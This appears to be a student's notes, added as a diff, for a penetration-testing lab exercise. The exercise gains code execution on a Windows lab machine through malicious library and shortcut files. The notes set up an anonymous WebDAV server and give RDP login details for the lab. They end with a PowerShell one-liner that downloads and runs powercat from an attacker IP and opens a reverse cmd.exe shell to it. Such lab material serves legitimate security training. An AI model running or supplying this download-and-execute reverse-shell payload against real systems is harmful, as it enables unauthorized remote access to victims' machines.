@@ -1,0 +1,14 @@
+Questions
+Follow the steps in this section to get code execution on the HR137 (VM Group 1 - VM #2) system by using library and shortcut files. Be aware that after every execution of a .lnk file from the WebDAV share, the library file from the SMB share will be removed. You can find the flag on the desktop of the hsmith user. You can use VM #1 of VM Group 1 to build the library file and shortcut.
+
+setup WebDAV on Kali
+pip3 install wsgidav
+mkdir /home/kali/webdav
+touch /home/kali/webdav/test.txt
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav
+
+xfreerdp into the VM#1
+xfreerdp /u:'offsec' /p:'lab' /v:192.168.158.194:3389 /size:95% /cert:ignore +clipboard /drive:smbfolder,/home/kali/Desktop/Windows
+
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.191:88/powercat.ps1');
+powercat -c 192.168.45.191 -p 8443 -e cmd.exe -ge"
